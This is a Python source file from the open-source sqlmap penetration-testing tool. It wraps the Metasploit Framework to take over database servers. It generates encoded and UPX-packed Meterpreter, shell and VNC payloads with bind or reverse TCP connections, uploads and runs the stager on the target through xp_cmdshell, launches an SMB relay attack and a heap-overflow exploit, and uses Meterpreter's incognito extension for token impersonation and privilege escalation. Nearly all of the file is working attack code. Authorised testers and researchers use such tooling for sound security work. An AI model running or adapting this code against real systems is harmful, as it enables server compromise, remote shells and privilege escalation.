#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import binascii
import os
import re
import stat
import sys
import time

from select import select
from subprocess import PIPE
from subprocess import Popen as execute

from lib.core.agent import agent
from lib.core.common import dataToStdout
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import pollProcess
from lib.core.common import randomRange
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapDataException
from lib.core.exception import sqlmapFilePathException
from lib.core.subprocessng import blockingReadFromFD
from lib.core.subprocessng import blockingWriteToFD
from lib.core.subprocessng import setNonBlocking
from lib.request.connect import Connect as Request
from lib.takeover.upx import upx


class Metasploit:
    """
    This class defines methods to call Metasploit for plugins.
    """

    def __initVars(self):
        self.connectionStr  = None
        self.rhostStr       = None
        self.portStr        = None
        self.payloadStr     = None
        self.encoderStr     = None

        self.resourceFile   = None

        self.localIP        = getLocalIP()
        self.remoteIP       = getRemoteIP()

        self.__msfCli       = os.path.normpath("%s/msfcli" % conf.msfPath)
        self.__msfConsole   = os.path.normpath("%s/msfconsole" % conf.msfPath)
        self.__msfEncode    = os.path.normpath("%s/msfencode" % conf.msfPath)
        self.__msfPayload   = os.path.normpath("%s/msfpayload" % conf.msfPath)

        self.__msfPayloadsList    = {
                                      "windows": {
                                                   1: ( "Meterpreter (default)", "windows/meterpreter" ),
                                                   2: ( "Shell", "windows/shell" ),
                                                   3: ( "VNC", "windows/vncinject" ),
                                                 },
                                      "linux":   {
                                                   1: ( "Shell", "linux/x86/shell" ),
                                                 }
                                    }

        self.__msfConnectionsList = {
                                      "windows": {
                                                   1: ( "Bind TCP (default)", "bind_tcp" ),
                                                   2: ( "Bind TCP (No NX)", "bind_nonx_tcp" ),
                                                   3: ( "Reverse TCP", "reverse_tcp" ),
                                                   4: ( "Reverse TCP (No NX)", "reverse_nonx_tcp" ),
                                                 },
                                      "linux":   {
                                                   1: ( "Bind TCP (default)", "bind_tcp" ),
                                                   2: ( "Reverse TCP", "reverse_tcp" ),
                                                 }
                                    }

        self.__msfEncodersList    = {
                                      "windows": {
                                                   1: ( "No Encoder", "generic/none" ),
                                                   2: ( "Alpha2 Alphanumeric Mixedcase Encoder", "x86/alpha_mixed" ),
                                                   3: ( "Alpha2 Alphanumeric Uppercase Encoder", "x86/alpha_upper" ),
                                                   4: ( "Avoid UTF8/tolower", "x86/avoid_utf8_tolower" ),
                                                   5: ( "Call+4 Dword XOR Encoder", "x86/call4_dword_xor" ),
                                                   6: ( "Single-byte XOR Countdown Encoder", "x86/countdown" ),
                                                   7: ( "Variable-length Fnstenv/mov Dword XOR Encoder", "x86/fnstenv_mov" ),
                                                   8: ( "Polymorphic Jump/Call XOR Additive Feedback Encoder", "x86/jmp_call_additive" ),
                                                   9: ( "Non-Alpha Encoder", "x86/nonalpha" ),
                                                  10: ( "Non-Upper Encoder", "x86/nonupper" ),
                                                  11: ( "Polymorphic XOR Additive Feedback Encoder (default)", "x86/shikata_ga_nai" ),
                                                  12: ( "Alpha2 Alphanumeric Unicode Mixedcase Encoder", "x86/unicode_mixed" ),
                                                  13: ( "Alpha2 Alphanumeric Unicode Uppercase Encoder", "x86/unicode_upper" ),
                                                 }
                                    }

        self.__msfSMBPortsList    = {
                                      "windows": {
                                                   1: ( "139/TCP (default)", "139" ),
                                                   2: ( "445/TCP", "445" ),
                                                 }
                                    }

        self.__portData           = {
                                      "bind":    "remote port numer",
                                      "reverse": "local port numer",
                                    }


    def __skeletonSelection(self, msg, lst=None, maxValue=1, default=1):
        if kb.os == "Windows":
            os = "windows"
        else:
            os = "linux"

        message = "which %s do you want to use?" % msg

        if lst:
            for num, data in lst[os].items():
                description = data[0]

                if num > maxValue:
                    maxValue = num

                if "default" in description:
                    default = num

                message += "\n[%d] %s" % (num, description)
        else:
            message += " [%d] " % default

        choice = readInput(message, default="%d" % default)

        if not choice:
            if lst:
                choice = str(default)
            else:
                return default

        elif not choice.isdigit():
            logger.warn("invalid value, only digits are allowed")
            return self.__skeletonSelection(msg, lst, maxValue, default)

        elif int(choice) > maxValue or int(choice) < 1:
            logger.warn("invalid value, it must be a digit between 1 and %d" % maxValue)
            return self.__skeletonSelection(msg, lst, maxValue, default)

        choice = int(choice)

        if lst:
            choice = lst[os][choice][1]

        return choice


    def __selectSMBPort(self):
        return self.__skeletonSelection("SMB port", self.__msfSMBPortsList)


    def __selectEncoder(self, encode=True):
        if kb.os == "Windows" and encode == True:
            return self.__skeletonSelection("payload encoding", self.__msfEncodersList)


    def __selectPayload(self, askChurrasco=True):
        if kb.os == "Windows" and conf.privEsc == True:
            infoMsg  = "forcing Metasploit payload to Meterpreter because "
            infoMsg += "it is the only payload that can be used to abuse "
            infoMsg += "Windows Impersonation Tokens via Meterpreter "
            infoMsg += "'incognito' extension to privilege escalate"
            logger.info(infoMsg)

            __payloadStr = "windows/meterpreter"

        else:
            __payloadStr = self.__skeletonSelection("payload", self.__msfPayloadsList)

        if __payloadStr == "windows/vncinject":
            choose = False

            if kb.dbms == "MySQL":
                debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                debugMsg += "user, it is likely that the the VNC "
                debugMsg += "injection will be successful"
                logger.debug(debugMsg)

            elif kb.dbms == "PostgreSQL":
                choose = True

                warnMsg  = "by default PostgreSQL on Windows runs as "
                warnMsg += "postgres user, it is unlikely that the VNC "
                warnMsg += "injection will be successful"
                logger.warn(warnMsg)

            elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                choose = True

                warnMsg  = "it is unlikely that the VNC injection will be "
                warnMsg += "successful because often Microsoft SQL Server "
                warnMsg += "%s runs as Network Service " % kb.dbmsVersion[0]
                warnMsg += "or the Administrator is not logged in"
                logger.warn(warnMsg)

            if choose == True:
                message  = "what do you want to do?\n"
                message += "[1] Give it a try anyway\n"
                message += "[2] Fall back to Meterpreter payload (default)\n"
                message += "[3] Fall back to Shell payload"

                while True:
                    choice = readInput(message, default="2")

                    if not choice or choice == "2":
                        __payloadStr = "windows/meterpreter"

                        break

                    elif choice == "3":
                        __payloadStr = "windows/shell"

                        break

                    elif choice == "1":
                        if kb.dbms == "PostgreSQL":
                            logger.warn("beware that the VNC injection might not work")

                            break

                        elif askChurrasco == False:
                            logger.warn("beware that the VNC injection might not work")

                            break

                        elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                            uploaded = self.uploadChurrasco()

                            if uploaded == False:
                                warnMsg  = "beware that the VNC injection "
                                warnMsg += "might not work"
                                logger.warn(warnMsg)

                            break

                    elif not choice.isdigit():
                        logger.warn("invalid value, only digits are allowed")

                    elif int(choice) < 1 or int(choice) > 2:
                        logger.warn("invalid value, it must be 1 or 2")

        return __payloadStr


    def __selectPort(self):
        for connType, connStr in self.__portData.items():
            if self.connectionStr.startswith(connType):
                return self.__skeletonSelection(connStr, maxValue=65535, default=randomRange(1025, 65535))


    def __selectRhost(self):
        if self.connectionStr.startswith("bind"):
            message = "which is the back-end DBMS address? [%s] " % self.remoteIP
            address = readInput(message, default=self.remoteIP)

            if not address:
                address = self.remoteIP

            return address

        elif self.connectionStr.startswith("reverse"):
            return None

        else:
            raise sqlmapDataException, "unexpected connection type"


    def __selectConnection(self):
        return self.__skeletonSelection("connection type", self.__msfConnectionsList)


    def __prepareIngredients(self, encode=True, askChurrasco=True):
        self.connectionStr  = self.__selectConnection()
        self.rhostStr       = self.__selectRhost()
        self.portStr        = self.__selectPort()
        self.payloadStr     = self.__selectPayload(askChurrasco)
        self.encoderStr     = self.__selectEncoder(encode)


    def __forgeMsfCliCmd(self, exitfunc="process"):
        self.__cliCmd  = "%s multi/handler PAYLOAD=" % self.__msfCli
        self.__cliCmd += "%s/%s" % (self.payloadStr, self.connectionStr)
        self.__cliCmd += " EXITFUNC=%s" % exitfunc
        self.__cliCmd += " LPORT=%s" % self.portStr

        if self.payloadStr == "windows/vncinject":
            self.__cliCmd += " DisableCourtesyShell=1"

        if self.connectionStr.startswith("bind"):
            self.__cliCmd += " RHOST=%s" % self.rhostStr

        elif self.connectionStr.startswith("reverse"):
            self.__cliCmd += " LHOST=%s" % self.localIP

        else:
            raise sqlmapDataException, "unexpected connection type"

        self.__cliCmd += " E"


    def __forgeMsfConsoleCmd(self):
        self.__consoleCmd = "%s -r %s" % (self.__msfConsole, self.resourceFile)


    def __forgeMsfConsoleResource(self):
        self.__prepareIngredients(encode=False, askChurrasco=False)

        self.__resource  = "use windows/smb/smb_relay\n"
        self.__resource += "set SRVHOST %s\n" % self.localIP
        self.__resource += "set SRVPORT %s\n" % self.__selectSMBPort()
        self.__resource += "set PAYLOAD %s/%s\n" % (self.payloadStr, self.connectionStr)
        self.__resource += "set LPORT %s\n" % self.portStr

        if self.connectionStr.startswith("bind"):
            self.__resource += "set RHOST %s\n" % self.rhostStr

        elif self.connectionStr.startswith("reverse"):
            self.__resource += "set LHOST %s\n" % self.localIP

        else:
            raise sqlmapDataException, "unexpected connection type"

        self.__resource += "exploit\n"

        self.resourceFile = "%s/%s" % (conf.outputPath, self.__randFile)
        self.resourceFp   = open(self.resourceFile, "w")

        self.resourceFp.write(self.__resource)
        self.resourceFp.close()


    def __forgeMsfPayloadCmd(self, exitfunc="process", output="exe", extra=None):
        self.__payloadCmd  = self.__msfPayload
        self.__payloadCmd += " %s/%s" % (self.payloadStr, self.connectionStr)
        self.__payloadCmd += " EXITFUNC=%s" % exitfunc
        self.__payloadCmd += " LPORT=%s" % self.portStr

        if self.connectionStr.startswith("reverse"):
            self.__payloadCmd += " LHOST=%s" % self.localIP

        elif not self.connectionStr.startswith("bind"):
            raise sqlmapDataException, "unexpected connection type"

        if kb.os == "Windows":
            self.__payloadCmd += " R | %s -e %s -t %s" % (self.__msfEncode, self.encoderStr, output)

            if extra is not None:
                self.__payloadCmd += " %s" % extra

        else:
            self.__payloadCmd += " X"


    def __runMsfCli(self, exitfunc="process"):
        self.__forgeMsfCliCmd(exitfunc)

        infoMsg  = "running Metasploit Framework 3 command line "
        infoMsg += "interface locally, wait.."
        logger.info(infoMsg)

        logger.debug("executing local command: %s" % self.__cliCmd)

        self.__msfCliProc = execute(self.__cliCmd, shell=True, stdin=PIPE, stdout=PIPE)


    def __runMsfConsole(self):
        infoMsg = "running Metasploit Framework 3 console locally, wait.."
        logger.info(infoMsg)

        logger.debug("executing local command: %s" % self.__consoleCmd)

        self.__msfConsoleProc = execute(self.__consoleCmd, shell=True, stdin=PIPE, stdout=PIPE)


    def __runMsfPayloadRemote(self):
        infoMsg  = "running Metasploit Framework 3 payload stager "
        infoMsg += "remotely, wait.."
        logger.info(infoMsg)

        if kb.os != "Windows":
            self.execCmd("chmod +x %s" % self.exeFilePathRemote, silent=True)

        cmd = "%s &" % self.exeFilePathRemote

        if self.cmdFromChurrasco == True:
            cmd = "%s \"%s\"" % (self.churrascoPath, cmd)

        if kb.dbms == "Microsoft SQL Server":
            cmd = self.xpCmdshellForgeCmd(cmd)

        # NOTE: calling the Metasploit payload from a system() function in
        # C on Windows (check on Linux the behaviour) for some reason
        # hangs it and the HTTP response goes into timeout, this does not
        # happen when running the it from Windows cmd.
        # Investigate and fix if possible
        self.execCmd(cmd, silent=True)


    def __loadMetExtensions(self, proc, metSess):
        if kb.os != "Windows":
            return

        if self.resourceFile != None:
            proc.stdin.write("sessions -l\n")
            proc.stdin.write("sessions -i %s\n" % metSess)

        proc.stdin.write("use priv\n")

        if conf.privEsc == True:
            print

            infoMsg  = "loading Meterpreter 'incognito' extension and "
            infoMsg += "displaying the list of Access Tokens availables. "
            infoMsg += "Choose which user you want to impersonate by "
            infoMsg += "using incognito's command 'impersonate_token'"
            logger.info(infoMsg)

            proc.stdin.write("use incognito\n")
            proc.stdin.write("getuid\n")
            proc.stdin.write("list_tokens -u\n")


    def __controlMsfCmd(self, proc, func):
        stdin_fd = sys.stdin.fileno()
        setNonBlocking(stdin_fd)

        proc_out_fd = proc.stdout.fileno()
        setNonBlocking(proc_out_fd)

        while True:
            returncode = proc.poll()

            if returncode is None:
                # Child hasn't exited yet
                pass
            else:
                logger.debug("connection closed properly")
                return returncode

            try:
                ready_fds = select([stdin_fd, proc_out_fd], [], [], 1)

                if stdin_fd in ready_fds[0]:
                    try:
                        proc.stdin.write(blockingReadFromFD(stdin_fd))
                    except IOError:
                        # Probably the child has exited
                        pass

                if proc_out_fd in ready_fds[0]:
                    out = blockingReadFromFD(proc_out_fd)
                    blockingWriteToFD(sys.stdout.fileno(), out)

                    # For --os-pwn and --os-bof
                    pwnBofCond  = self.connectionStr.startswith("reverse")
                    pwnBofCond &= "Starting the payload handler" in out

                    # For --os-smbrelay
                    smbRelayCond = "Server started" in out

                    if pwnBofCond or smbRelayCond:
                        func()

                    metSess = re.search("Meterpreter session ([\d]+) opened", out)

                    if metSess and self.payloadStr == "windows/meterpreter":
                        self.__loadMetExtensions(proc, metSess.group(1))

            except EOFError:
                returncode = proc.wait()

                return returncode


    def createMsfShellcode(self):
        infoMsg  = "creating Metasploit Framework 3 multi-stage shellcode "
        infoMsg += "for the exploit"
        logger.info(infoMsg)

        self.__randStr           = randomStr(lowercase=True)
        self.shellcodeChar       = ""
        self.__shellcodeFilePath = "%s/sqlmapmsf%s" % (conf.outputPath, self.__randStr)
        self.__shellcodeFileP    = open(self.__shellcodeFilePath, "wb")

        self.__initVars()
        self.__prepareIngredients(askChurrasco=False)
        self.__forgeMsfPayloadCmd(exitfunc="seh", output="raw", extra="-b \"\\x00\\x27\"")

        logger.debug("executing local command: %s" % self.__payloadCmd)
        process = execute(self.__payloadCmd, shell=True, stdout=self.__shellcodeFileP, stderr=PIPE)

        dataToStdout("\r[%s] [INFO] creation in progress " % time.strftime("%X"))
        pollProcess(process)
        payloadStderr = process.communicate()[1]

        if kb.os == "Windows":
            payloadSize = re.search("size ([\d]+)", payloadStderr, re.I)
        else:
            payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)

        self.__shellcodeFileP.close()

        if payloadSize:
            payloadSize = payloadSize.group(1)

            debugMsg = "the shellcode size is %s bytes" % payloadSize
            logger.debug(debugMsg)
        else:
            errMsg = "failed to create the shellcode (%s)" % payloadStderr
            raise sqlmapFilePathException, errMsg

        self.__shellcodeFileP  = open(self.__shellcodeFilePath, "rb")
        self.__shellcodeString = self.__shellcodeFileP.read()
        self.__shellcodeFileP.close()

        os.unlink(self.__shellcodeFilePath)

        hexStr = binascii.hexlify(self.__shellcodeString)

        for hexPair in range(0, len(hexStr), 2):
            self.shellcodeChar += "CHAR(0x%s)+" % hexStr[hexPair:hexPair+2]


    def createMsfPayloadStager(self, initialize=True):
        if initialize == True:
            infoMsg = ""
        else:
            infoMsg = "re"

        infoMsg += "creating Metasploit Framework 3 payload stager"

        logger.info(infoMsg)

        self.__randStr = randomStr(lowercase=True)

        if kb.os == "Windows":
            self.exeFilePathLocal = "%s/sqlmapmsf%s.exe" % (conf.outputPath, self.__randStr)
        else:
            self.exeFilePathLocal = "%s/sqlmapmsf%s" % (conf.outputPath, self.__randStr)

        self.__exeFileP = open(self.exeFilePathLocal, "wb")

        if initialize == True:
            self.__initVars()

        if self.payloadStr == None:
            self.__prepareIngredients()

        self.__forgeMsfPayloadCmd()

        logger.debug("executing local command: %s" % self.__payloadCmd)
        process = execute(self.__payloadCmd, shell=True, stdout=self.__exeFileP, stderr=PIPE)

        dataToStdout("\r[%s] [INFO] creation in progress " % time.strftime("%X"))
        pollProcess(process)
        payloadStderr = process.communicate()[1]

        if kb.os == "Windows":
            payloadSize = re.search("size ([\d]+)", payloadStderr, re.I)
        else:
            payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)

        self.__exeFileP.close()

        os.chmod(self.exeFilePathLocal, stat.S_IRWXU)

        if payloadSize:
            payloadSize = payloadSize.group(1)
            exeSize     = os.path.getsize(self.exeFilePathLocal)
            packedSize  = upx.pack(self.exeFilePathLocal)
            debugMsg    = "the encoded payload size is %s bytes, " % payloadSize

            if packedSize:
                debugMsg += "as a compressed portable executable its size "
                debugMsg += "is %d bytes, decompressed it " % packedSize
                debugMsg += "was %s bytes large" % exeSize
            else:
                debugMsg += "as a portable executable its size is "
                debugMsg += "%s bytes" % exeSize

            logger.debug(debugMsg)
        else:
            errMsg = "failed to create the payload stager (%s)" % payloadStderr
            raise sqlmapFilePathException, errMsg


    def uploadMsfPayloadStager(self):
        self.exeFilePathRemote = "%s/%s" % (conf.tmpPath, os.path.basename(self.exeFilePathLocal))

        logger.info("uploading payload stager to '%s'" % self.exeFilePathRemote)
        self.writeFile(self.exeFilePathLocal, self.exeFilePathRemote, "binary", False)

        os.unlink(self.exeFilePathLocal)


    def pwn(self):
        self.__runMsfCli()

        if self.connectionStr.startswith("bind"):
            self.__runMsfPayloadRemote()

        debugMsg  = "Metasploit Framework 3 command line interface exited "
        debugMsg += "with return code %s" % self.__controlMsfCmd(self.__msfCliProc, self.__runMsfPayloadRemote)
        logger.debug(debugMsg)


    def smb(self):
        self.__initVars()
        self.__randFile = "sqlmapunc%s.txt" % randomStr(lowercase=True)

        if kb.dbms in ( "MySQL", "PostgreSQL" ):
            self.uncPath = "\\\\\\\\%s\\\\%s" % (self.localIP, self.__randFile)
        else:
            self.uncPath = "\\\\%s\\%s" % (self.localIP, self.__randFile)

        self.__forgeMsfConsoleResource()
        self.__forgeMsfConsoleCmd()
        self.__runMsfConsole()

        debugMsg  = "Metasploit Framework 3 console exited with return "
        debugMsg += "code %s" % self.__controlMsfCmd(self.__msfConsoleProc, self.uncPathRequest)
        logger.debug(debugMsg)

        os.unlink(self.resourceFile)


    def bof(self):
        self.__runMsfCli(exitfunc="seh")

        if self.connectionStr.startswith("bind"):
            self.spHeapOverflow()

        debugMsg  = "Metasploit Framework 3 command line interface exited "
        debugMsg += "with return code %s" % self.__controlMsfCmd(self.__msfCliProc, self.spHeapOverflow)
        logger.debug(debugMsg)
